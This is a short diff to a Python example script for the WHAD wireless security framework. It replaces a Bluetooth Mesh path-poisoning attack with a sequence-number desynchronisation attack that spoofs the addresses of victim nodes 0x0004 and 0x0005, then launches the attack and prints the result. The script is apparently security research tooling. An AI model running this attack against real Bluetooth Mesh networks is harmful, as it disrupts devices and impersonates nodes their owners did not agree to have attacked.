@@ -2,9 +2,9 @@ from whad.device import WhadDevice
 from whad.ble.exceptions import ConnectionLostException
 import sys
 from whad.btmesh.connector.provisionee import Provisionee
-from whad.btmesh.attacker.path_poison_bidir import (
-    PathPoisonBidirAttacker,
-    PathPoisonBidirConfiguration,
+from whad.btmesh.attacker.seqnum_desynch import (
+    SeqNumDesynchAttacker,
+    SeqNumDesynchConfiguration,
 )
 from time import sleep
 from whad.btmesh.stack.utils import MeshMessageContext
@@ -28,12 +28,18 @@ try:
     print("Node is (auto) provisioned !")
 
     # Create the attacker object and launch the attack
-    attack_conf = PathPoisonBidirConfiguration()
-    attack_conf.victim = 0x0004  # attack node 0x04
+    attack_conf = SeqNumDesynchConfiguration()
+    attack_conf.victims = [
+        0x0004,
+        0x0005,
+    ]  # list of victims, .i.e the ones we spoof the address of
 
-    attacker = PathPoisonBidirAttacker(connector=provisionee, configuration=attack_conf)
+    attacker = SeqNumDesynchAttacker(connector=provisionee, configuration=attack_conf)
 
-    print("Lauching the PathPoisonBidir attack on 0x%x" % attack_conf.victim)
+    print(
+        "Lauching the SeqNumDesynch attack, spoofing %s"
+        % str([hex(addr) for addr in attack_conf.victims])
+    )
     attacker.launch(asynch=False)
 
     attacker.show_result()
@@ -48,6 +54,5 @@ except (KeyboardInterrupt, SystemExit):
 except WhadDeviceNotFound:
     print("[e] Device not found")
     exit(1)
-
 
 exit(0)
